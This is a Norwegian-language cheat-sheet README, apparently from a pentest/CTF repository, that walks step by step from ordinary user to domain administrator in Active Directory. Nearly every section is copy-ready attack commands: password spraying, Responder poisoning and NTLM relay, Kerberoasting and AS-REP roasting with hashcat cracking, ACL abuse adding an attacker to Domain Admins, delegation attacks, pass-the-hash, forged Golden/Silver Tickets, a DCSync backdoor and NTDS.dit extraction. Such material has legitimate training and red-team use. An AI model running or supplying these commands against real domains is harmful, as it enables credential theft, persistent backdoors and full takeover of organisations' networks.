# 🏢 Angrepsmetodikk for Active Directory

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Begreper:** Kartlegging (*enumeration*) samler informasjon om domenet. En ACL er en tilgangskontrolliste; SPN identifiserer en tjeneste; TGT og TGS er Kerberos-billetter. Sideveis bevegelse betyr tilgang til andre maskiner. Golden/Silver Ticket er navn på forfalskede Kerberos-billetter.
>
> **Presisering av forutsetninger:** Eksemplene er ikke en garantert vei fra vanlig bruker til domeneadministrator. AS-REP roasting gjelder kontoer uten påkrevd forhåndsautentisering. DCSync krever relevante replikeringsrettigheter; vanlig domenetilgang er utilstrekkelig. Delegeringsangrep forutsetter også riktige objektrettigheter og delegeringsinnstillinger. [Microsoft: replikeringsrettighet](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all), [Kerberos-delegering](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview).
>
> **Versjonsmerknad:** BloodHound-spørringene bygger på eldre grafskjemaer; egenskaper og kantnavn kan variere. En enkelt `GetChanges`-kant beviser ikke alene DCSync-tilgang. Legacy BloodHound og CE må bruke kompatible innsamlere. [SpecterOps: SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound).

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Trinnvis veiledning fra bruker til domeneadministrator
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

<a id="-oversikt-over-angrepsforløpet"></a>
## 🗺️ Oversikt over angrepsforløpet

```
┌─────────────────────────────────────────────────────────────────────────┐
│                            AD-ANGREPSMETODIKK                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   FASE 1: Kartlegging    FASE 2: Første tilgang  FASE 3: Eskalering     │
│   ├── Nettverksskanning  ├── Passordspraying     ├── Kerberoast         │
│   ├── LDAP-kartlegging   ├── LLMNR-forgiftning   ├── AS-REP             │
│   ├── Brukerkartlegging  └── NTLM relay          └── ACL-misbruk        │
│   └── BloodHound                                                        │
│                                                                         │
│   FASE 4: Sideveis       FASE 5: Varig tilgang   FASE 6: Domenet        │
│   ├── Pass-the-Hash      ├── Golden Ticket       ├── DCSync             │
│   ├── WinRM/PSExec       ├── Silver Ticket       ├── NTDS.dit           │
│   └── WMI-kjøring        └── Skeleton Key        └── Full kontroll!     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Innholdsfortegnelse

- [Oversikt over angrepsforløpet](#-oversikt-over-angrepsforløpet)
- [Fase 1: Kartlegging](#-fase-1-kartlegging)
- [Fase 2: Innledende tilgang](#-fase-2-innledende-tilgang)
- [Fase 3: Rettighetseskalering](#-fase-3-rettighetseskalering)
- [Fase 4: Sideveis bevegelse](#-fase-4-sideveis-bevegelse)
- [Fase 5: Vedvarende tilgang](#-fase-5-vedvarende-tilgang)
- [Fase 6: Kontroll over domenet](#-fase-6-kontroll-over-domenet)
- [Hurtigreferanse for kommandoer](#-hurtigreferanse-for-kommandoer)
- [CTF-tips](#-ctf-tips)
- [Relaterte hurtigreferanser](#-relaterte-hurtigreferanser)

---

## 🔍 Fase 1: Kartlegging

### 1.1 Oppdagelse av nettverket

```bash
# Finn domenekontrollere
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identifiser AD-tjenester
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Viktige porter:**
| Port | Tjeneste | Formål |
|------|---------|---------|
| 53 | DNS | Navneoppslag i domenet |
| 88 | Kerberos | Autentisering |
| 389 | LDAP | Katalogtjeneste |
| 445 | SMB | Fildelinger |
| 636 | LDAPS | Sikker LDAP |
| 5985 | WinRM | Fjernadministrasjon |

### 1.2 Anonym kartlegging (uten legitimasjon)

```bash
# Nulløkt over RPC
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Anonym LDAP-binding
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Kartlegg brukere med Kerbrute (uten legitimasjon!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Med gyldig legitimasjon

```bash
# Hent domeneinformasjon
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP-kartlegging
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Kartlegging med PowerView

```powershell
# Importer PowerView
Import-Module .\PowerView.ps1

# Domeneinformasjon
Get-Domain
Get-DomainController

# Finn interessante mål
Get-DomainUser -SPN                    # Utsatt for Kerberoasting
Get-DomainUser -PreauthNotRequired      # Utsatt for AS-REP roasting
Get-DomainComputer -Unconstrained       # Delegering

# Finn økter for domeneadministratorer (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Datainnsamling med BloodHound

```bash
# Fra Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Fra Windows (SharpHound)
.\SharpHound.exe -c All
```

**BloodHound-spørringer:**
```cypher
# Korteste vei til DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Brukere utsatt for Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Brukere med DCSync-rettigheter
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Fase 2: Innledende tilgang

### 2.1 Passordspraying

```bash
# Passordspraying med CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Passordspraying med Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Vanlige passord:**
```
Årstid+år: Summer2024!, Winter2024
Firmanavn+123: Company123!
Welcome1, Password1
```

### 2.2 Forgiftning av LLMNR/NBT-NS

```bash
# Terminal 1: Start opp Responder
sudo responder -I eth0 -wPv

# Vent på hasher …
# NTLMv2 fanget opp!

# Terminal 2: Knekk hashen
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM relay (videresending)

```bash
# Finn mål uten SMB-signering
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB avslått)
sudo responder -I eth0

# Relay-angrep
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP roasting (krever ikke passord!)

```bash
# Finn sårbare brukere
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Eller med legitimasjon
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Knekk
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-fase-3-rettighetseskalering"></a>
## ⬆️ Fase 3: Rettighetseskalering

### 3.1 Kerberoasting

```bash
# Fra Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Fra Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Knekk
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Misbruk av ACL-er

**GenericAll på bruker:**
```powershell
# Endre passord
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll på gruppe:**
```powershell
# Legg deg selv til i gruppen
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Angi SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Gi deg selv DCSync-rettigheter
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Angrep mot delegering

**Ubegrenset delegering (Unconstrained Delegation):**
```powershell
# Finn mål
Get-DomainComputer -Unconstrained

# Overvåk etter TGT-er
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Utløs (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Begrenset delegering (Constrained Delegation):**
```bash
# Be om billett
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Bruk billett
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Ressursbasert begrenset delegering (RBCD):**
```bash
# Opprett maskinkonto
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Angi RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Hent billett
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-fase-4-sideveis-bevegelse"></a>
## ➡️ Fase 4: Sideveis bevegelse

### 4.1 Pass-the-Hash

```bash
# PSExec med hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Eksporter billett
.\Rubeus.exe dump

# Bruk billett (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Bruk billett (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM med passord
evil-winrm -i 10.10.10.10 -u admin -p password

# Med hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Hent TGT med hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Bruk nå Kerberos
dir \\server\share
```

---

## 🔒 Fase 5: Vedvarende tilgang

### 5.1 Golden Ticket

```bash
# Krever: NTLM-hash for krbtgt + domene-SID

# Opprett billett
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Bruk
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Opprett tjenestebillett
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 DCSync-bakdør

```powershell
# Legg til DCSync-rettigheter for en vilkårlig bruker
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Fase 6: Kontroll over domenet

### 6.1 DCSync

```bash
# Hent ut alle hasher
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Med hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Bestemt bruker
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Uthenting av NTDS.dit

```bash
# Opprett skyggekopi
vssadmin create shadow /for=C:

# Kopier NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Hent ut frakoblet
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Uthenting med CrackMapExec

```bash
# Hent ut NTDS via DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Hurtigreferanse for kommandoer

### Kartleggingskommandoer på én linje

```bash
# Finn domenekontrollere
nmap -p 88,389 --open 10.10.10.0/24

# Kartlegg brukere (uten legitimasjon)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Finn kontoer utsatt for AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Hurtigreferanse for angrep

| Angrep | Kommando |
|--------|---------|
| Passordspraying | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Knekking av hasher

| Hashtype | Hashcat-modus |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 CTF-tips

1. **Kartlegg alltid først** – Ikke angrip i blinde
2. **Se etter AS-REP** – Hasher uten legitimasjon!
3. **Kjør BloodHound** – Finn angrepsveier
4. **Kontroller ACL-er** – De er ofte feilkonfigurert
5. **Se etter delegering** – Muligheter som kan være enkle å utnytte
6. **Spray forsiktig** – Kontoer kan låses!
7. **Ta vare på all legitimasjon** – Du trenger den senere

---

## 📚 Relaterte hurtigreferanser

- [BloodHound](../../BloodHound/translations/README.nb.md)
- [Impacket](../../Impacket/translations/README.nb.md)
- [CrackMapExec](../../CrackMapExec/translations/README.nb.md)
- [Rubeus](../../Rubeus/translations/README.nb.md)
- [PowerView](../../PowerView/translations/README.nb.md)
- [Responder](../../Responder/translations/README.nb.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)

---

<p align="center">
  <b>🏢 Fra bruker til domeneadministrator!</b><br>
  <i>Følg metodikken og ta kontroll over domenet</i>
</p>
